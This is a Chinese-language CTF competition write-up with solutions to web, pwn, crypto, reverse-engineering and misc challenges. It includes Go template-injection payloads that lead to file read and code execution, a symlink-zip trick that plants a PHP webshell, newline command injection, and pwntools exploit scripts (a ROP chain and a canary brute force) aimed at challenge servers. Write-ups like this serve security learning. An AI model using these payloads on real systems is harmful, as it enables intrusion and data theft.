- - - - - -

Web
===

- - - - - -

go\_session
-----------

伪造session

发现自己重新搭一次环境,把guest改为admin

把cookies跑出来放进去就对了(密钥为空)

### 问题分析

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685389688147-a08fecac-434e-427e-98ff-0d9c1b25c441.png)

从代码中可以看到，我们把`c *gin.Context`传送给模板引擎，所以在ssti时可以使用`c *gin.Context`这一变量。

### pongo2 Django文档

于是我们可以翻看pongo2文档：

<https://pkg.go.dev/github.com/flosch/pongo2#section-readme>

可以知道，它是完全兼容Django模板的

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390146534-662ac16e-6ba9-4819-98d2-26190be4025a.png)

所以我们看Django的模板：

<https://django.readthedocs.io/en/1.7.x/topics/templates.html>'

看什么文档啊，还得是GPT

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390672825-94f817b8-2ad3-407a-9e05-5b1f33aaa9ce.png)

因此可以使用include进行文件读取

当然文档的查询方法，可以参考其他师傅的:

Django的文档

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390857163-1589e9a4-0be1-4d8c-9791-9799c01c816d.png)  
Tags

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390856649-e7444b6f-9e6d-48d3-88cb-098b105e3e22.png)  
Built-in tag reference

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390856596-a598cbb7-c86a-43ca-9125-a56d7307fb00.png)  
include

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390856369-1edc8beb-baff-42f3-9a5e-de966ba3d46a.png)

上面的include可以读取文件，但现在要把文件名传进去，不能直接传引号的字符串，所以需要一个可控字符串变量。

### `c *gin.Context`的使用

<https://pkg.go.dev/github.com/gin-gonic/gin#pkg-index>

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685390968293-7d55454c-56bd-4987-81f7-ccfeb6992cfd.png)

因此可以得到，文件读取的payload：

```php
{%include c.Request.Referer()%} #通过请求头的Referer
{%include c.Request.Host()%} #通过请求头的Host
{%include c.Query(c.ClientIP())%} #通过?ip\_add=/app/server.py读取
```

可以查看`/server/app.py`得知python代码：

发现它是debug模式的，**热部署（就是每次修改之后会重新编译运行一次）**

于是我们覆盖/server/app.py，进行RCE

具体payload

```php
{{c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))}}
#或者
{{c.SaveUploadedFile(c.FormFile(c.Request.Host),c.Request.Referer())}}
```

注意：

1、python有一定要是debug模式，debug有热部署

2、命令执行输出

```php
result = subprocess.run(\['cat', '/8c7b84719837708f8a34\_flag'\], stdout=subprocess.PIPE)
return result.stdout.decode()
```

3、10.0.0.5为自己的ip,可以通过模板注入{{c.ClientIP()}}查看

最后的请求包

```php
GET /admin?name={{c.SaveUploadedFile(c.FormFile(c.ClientIP()),c.Query(c.ClientIP()))}}&10.0.0.5=/app/server.py HTTP/1.1
Host: 123.56.135.185:34466
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7IWRoUoGnVmsx4c3
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36 Edg/113.0.1774.50
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: session-name=MTY4NTE1MjUwNXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXz4a\_LGemcYTYn-el4CAu5G5Fg8dJgY-\_pbUkyM3VIfqQ==
Connection: close
Content-Length: 499

------WebKitFormBoundary7IWRoUoGnVmsx4c3
Content-Disposition: form-data; name="10.0.0.5"; filename="1.py"
Content-Type: text/x-python

import subprocess
from flask import Flask,request

app = Flask(\_\_name\_\_)

@app.route('/')
def index():
    result = subprocess.run(\['cat', '/8c7b84719837708f8a34\_flag'\], stdout=subprocess.PIPE)
    return result.stdout.decode()

if \_\_name\_\_== "\_\_main\_\_":
    app.run(host="127.0.0.1",port=5000,debug=True)
------WebKitFormBoundary7IWRoUoGnVmsx4c3--
```

最后访问`/flask?name=/`

![](https://cdn.nlark.com/yuque/0/2023/png/26062900/1685275483661-f3708b58-7eb1-4b83-9a7a-dff365cf8e3d.png)

unzip
-----

构造软连接：

```Python
ln -s / .binbin
zip --symlinks root.zip .binbin
```

上传压缩包，解压

再利用软连接.binbin,生成一个可以自动解压到 `.binbin/var/www/html/binbin.php`的压缩包，`binbin.php`是`webshell`

生成压缩包脚本：

```Python
import zipfile

zf = zipfile.ZipFile('out.zip', 'w')

fname = './shell.php'

zf.write(fname, '.binbin/var/www/html/binbin.php')
```

再上传，解压

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-efe4db25b04d6ab346a458f210624612a00ac259.png)

dumpit
------

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a40350e25ab96d0935683fdf4104223953eb0179.png)

过滤的符号：

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-89a70f4a754ee0e96b8417baf1a19c768ad3592c.png)

/?db=bibin&amp;table\_2\_dump=%00

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-081f00631fe7a11c95bbde993c5641ce94afd510.png)

/?db=bibin&amp;table\_2\_dump=%0a

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-0e60805a815f535cc40c357c73b1b630f8637e1d.png)

/?db=q&amp;table\_2\_dump=%0awhoami%0a /?db=q&amp;table\_2\_dump=%0env%0a //环境变量

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9717304052e225cc61bc8cc123abd71bec6662c3.png)

Pwn
===

- - - - - -

烧烤摊儿
----

要负数瓶酒来加钱买摊，之后栈溢出orw

```Python
from pwn import *
from LibcSearcher import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

mode = 0
if mode == 1:
    fang = process("./shaokao")  
else:
    fang = remote("39.106.48.123",34543)

def debug():
    gdb.attach(fang)
    pause()

def pijiu(idx,num):
    fang.recvuntil("> ")
    fang.sendline(str(1))
    fang.recvuntil("3. 勇闯天涯\n")
    fang.sendline(str(idx))
    fang.recvuntil("来几瓶？\n")
    fang.sendline(str(num))

def chuan(idx,num):
    fang.recvuntil("> ")
    fang.sendline(str(2))
    fang.recvuntil("3. 鸡肉串\n")
    fang.sendline(str(idx))
    fang.recvuntil("来几串？\n")
    fang.sendline(str(num))

def yue():
    fang.recvuntil("> ")
    fang.sendline(str(3))

def chengbao():
    fang.recvuntil("> ")
    fang.sendline(str(4))

def gaming(cont):
    fang.recvuntil("> ")
    fang.sendline(str(5))
    fang.recvuntil("烧烤摊儿已归你所有，请赐名：\n")
    fang.sendline(cont)

pop_rdi_ret = 0x000000000040264f # : pop rdi ; ret
pop_rsi_ret = 0x000000000040a67e # : pop rsi ; ret
pop_rdx_rbx_ret = 0x00000000004a404b # : pop rdx ; pop rbx ; ret
pop_rcx = 0x00000000004a972b # : pop rcx ; add eax, 0x1480000 ; ret
name_addr = 0x4E60F0
open64_addr = 0x000000000457C90
read_addr = 0x000000000457DC0
write_addr = 0x000000000457E60
fopen64_addr = 0x00000000041A600
r_addr = 0x4b8785

# fopen64   .text   000000000041A600    000000F6    00000028        R   .   .   .   .   .   T   .
# open64    .text   0000000000457C90    00000128    00000078    00000001    R   .   .   .   .   .   T   .
# read  .text   0000000000457DC0    0000009D    00000020        R   .   .   .   .   .   .   .
# write .text   0000000000457E60    0000009D    00000020        R   .   .   .   .   .   .   .

# gdb.attach(fang,'b *0x401FA8 ')
# pause()

pijiu(1,-9997)

chengbao()

# payload = "/flag\x00"
# gaming(payload)

payload = b"/flag\x00"
payload = payload.ljust(0x28,b'a')
payload += p64(pop_rdi_ret) + p64(name_addr) + p64(pop_rsi_ret) + p64(r_addr) + p64(fopen64_addr)
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(name_addr) + p64(pop_rdx_rbx_ret) + p64(0x30) * 2 + p64(read_addr)
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(name_addr) + p64(pop_rdx_rbx_ret) + p64(0x30) * 2 + p64(write_addr)
gaming(payload)
# debug()

fang.interactive()
```

**funcanary**
-------------

fork出来的canary是一样的，爆破canary后把低位改成backdoor就可以了，改低位也要爆破一下

```JSON
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='amd64', os='linux')
local = 1
elf = ELF('./funcanary')

def debug(cmd='\n'):
    gdb.attach(p,cmd)
    pause()

def pwn():
    p.recvuntil('welcome\n')
    canary = '\x00'
    for k in range(7):
        for i in range(256):
            print("the " + str(k + 1) + ": " + chr(i))
            p.send('a'*0x68 + canary + chr(i))
            a = p.recvuntil("welcome\n")
            print(a)
            if b"fun" in a:
                canary += chr(i)
                print("canary: " + canary)
                break

    # 64 8
    # 32 4
    # 16 2
    # b *(0x555555554000 + 0x1229)
    addr_base=0x0231
    addr = 0x5231
    addr2 = 0x5229
    # payload = 'A' * 0x68 + canary + 'A' * 12 + p32(addr)
    for i in range(1024):
        addr=addr_base+(i%16)*0x1000
        payload = 'A' * 0x68 + canary + 'A' * 8 + p16(addr).decode("unicode_escape")
        p.send(payload)

        now = p.recv(1024)
        if b"flag" in now:
            print(now)
            pause()
    # p.interactive()

if __name__ == "__main__":
    mode = 0
    while True:
        if mode:
            p = process('./funcanary')

        else:
            p = remote('39.107.137.13',20940)
        try:
            pwn()
            p.interactive()
        except:
            p.close()
```

Crypto
======

- - - - - -

基于国密SM2算法的密钥密文分发
----------------

非预期：

跟着文档操作login，allkey，quantum，在search中能直接看到quantumStringServer的值，在check提交

最后在search中看到flag

可信度量
----

非预期：

grep寻找flag，发现在proc/22/task/22/environ

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-da46f1285578dff64b8839026617e08143e1d3d7.png)

Sign\_in\_passwd
----------------

```Bash
j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D
GHI3KLMNJOPQRSTUb%3DcdefghijklmnopWXYZ%2F12%2B406789VaqrstuvwxyzABCDEF5
```

第二行url解码后作为编码表，再将第一行base64解码

RE
==

- - - - - -

**babyre**
----------

在[Snap! 8.2.3 (berkeley.edu)](https://snap.berkeley.edu/snap/snap.html)导入附件

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-8c7ca18a4ed6f475d9b690748b242bdddcc6377c.png)

在输入之前插入一个show variable把secret输出出来

导出之后前后异或解密

```Python
data=[102,10,13,6,28,74,3,1,3,7,85,0,4,75,20,92,92,8,28,25,81,83,7,28,76,88,9,0,29,73,0,86,4,87,87,82,84,85,4,85,87,30]
flag=''
for i in range(len(data)-1):
    data[i+1]=data[i]^data[i+1]

for i in range(len(data)):
    flag+=chr(data[i])
print(flag)
```

**moveAside**
-------------

[movfuscator混淆\_mov混淆\_Cherest\_San的博客-CSDN博客](https://blog.csdn.net/CherestSan/article/details/117608664)

解mov混淆

远程动态调试，找到有点像flag的串

追踪后发现最后加了18

减上18后感觉像是异或，异或爆破后，后小写，并改成uuid格式得到flag

- - - - - -

MISC
====

签到卡
---

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3d881849c295764237d0eeba4c43e583125a168a.png)

pyshell
-------

进入python shell，限制字符个数为7

利用python特性，下划线表示上次运行结果

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-a003aeba1732b0d038022f777e74a47f6e7f1b4f.png)

被加密的生产流量
--------

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-12d5564a3f4afb7f1ab5504a4e1d4bf756309ee1.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-9526bae51c4c7019e7c43dc136d9b38c7a8508b9.png)

问卷调查
----

填问卷拿flag